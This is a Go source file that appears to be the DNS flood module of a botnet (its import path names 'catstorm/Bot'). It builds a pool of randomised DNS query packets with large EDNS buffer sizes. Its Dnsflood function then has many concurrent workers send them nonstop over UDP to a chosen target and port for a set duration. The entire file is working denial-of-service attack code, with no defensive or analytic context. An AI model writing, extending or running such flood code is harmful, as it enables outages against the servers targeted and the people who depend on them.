package l4

import (
	"context"
	"encoding/binary"
	"net"
	"sync"
	"catstorm/Bot/Methods"
)

var dnsQTypes = []uint16{1, 15, 16, 28, 99, 255}
var dnsTLDs = []string{"com", "net", "org", "ru", "de", "uk", "xyz", "io", "top", "info", "cc", "ws"}
var dnsDomains = []string{"google", "cloudflare", "amazon", "microsoft", "facebook", "apple", "netflix", "twitter", "github", "gitlab", "digitalocean", "linode", "heroku", "mysql", "nginx", "apache", "linux", "debian", "ubuntu", "centos", "docker", "kubernetes", "python", "node", "golang", "rust", "java", "oracle", "cisco", "vmware", "adobe", "salesforce", "paypal", "shopify", "wordpress", "wikipedia", "reddit", "stackoverflow", "linkedin", "dropbox", "telegram", "whatsapp", "snapchat", "instagram", "pinterest", "tumblr", "spotify", "slack", "zoom", "mongodb", "redis", "elastic", "grafana", "prometheus", "jenkins", "travis", "hashicorp", "terraform", "ansible", "puppet", "chef", "splunk", "datadog", "newrelic", "atlassian", "jira", "confluence", "sentry", "logstash", "kibana", "webpack", "babel", "gatsby", "vercel", "netlify", "herokuapp"}

func dnsEncodeName(domain string) []byte {
	buf := make([]byte, 0, len(domain)+2)
	for i := 0; i < len(domain); {
		dot := i
		for dot < len(domain) && domain[dot] != '.' {
			dot++
		}
		labelLen := dot - i
		if labelLen > 63 {
			labelLen = 63
		}
		buf = append(buf, byte(labelLen))
		buf = append(buf, []byte(domain[i:i+labelLen])...)
		i = dot + 1
	}
	buf = append(buf, 0)
	return buf
}

func buildDnsPacket(rng *methods.XorShift64) []byte {
	tld := dnsTLDs[int(rng.Uint64()%uint64(len(dnsTLDs)))]
	domain := dnsDomains[int(rng.Uint64()%uint64(len(dnsDomains)))]
	sub := dnsDomains[int(rng.Uint64()%uint64(len(dnsDomains)))]
	fqdn := sub + "." + domain + "." + tld

	qtype := dnsQTypes[int(rng.Uint64()%uint64(len(dnsQTypes)))]

	encoded := dnsEncodeName(fqdn)

	pkt := make([]byte, 12+len(encoded)+4+11)

	binary.BigEndian.PutUint16(pkt[0:2], uint16(rng.Uint64()))
	binary.BigEndian.PutUint16(pkt[2:4], 0x0100)
	binary.BigEndian.PutUint16(pkt[4:6], 1)
	binary.BigEndian.PutUint16(pkt[6:8], 0)
	binary.BigEndian.PutUint16(pkt[8:10], 0)
	binary.BigEndian.PutUint16(pkt[10:12], 1)

	off := 12
	copy(pkt[off:], encoded)
	off += len(encoded)

	binary.BigEndian.PutUint16(pkt[off:off+2], qtype)
	binary.BigEndian.PutUint16(pkt[off+2:off+4], 1)
	off += 4

	pkt[off] = 0
	off++
	binary.BigEndian.PutUint16(pkt[off:off+2], 41)
	off += 2
	binary.BigEndian.PutUint16(pkt[off:off+2], 4096)
	off += 2
	pkt[off] = 0
	off++
	pkt[off] = 0
	off++
	binary.BigEndian.PutUint16(pkt[off:off+2], 0)
	off += 2
	binary.BigEndian.PutUint16(pkt[off:off+2], 0)
	off += 2

	return pkt[:off]
}

var dnsPool [][]byte
var dnsPoolOnce sync.Once

func initDnsPool() {
	rng := methods.NewXorShift64()
	dnsPool = make([][]byte, 64)
	for i := range dnsPool {
		dnsPool[i] = buildDnsPacket(rng)
	}
}

func Dnsflood(ctx context.Context, target, port string, sec int) {
	raddr, err := net.ResolveUDPAddr("udp", target+":"+port)
	if err != nil {
		return
	}

	dnsPoolOnce.Do(initDnsPool)

	var wg sync.WaitGroup
	workers := methods.Workers()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, raddr)
			if err != nil {
				return
			}
			defer conn.Close()

			idx := uint64(0)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					conn.Write(dnsPool[idx%64])
					idx++
				}
			}
		}()
	}
	wg.Wait()
}
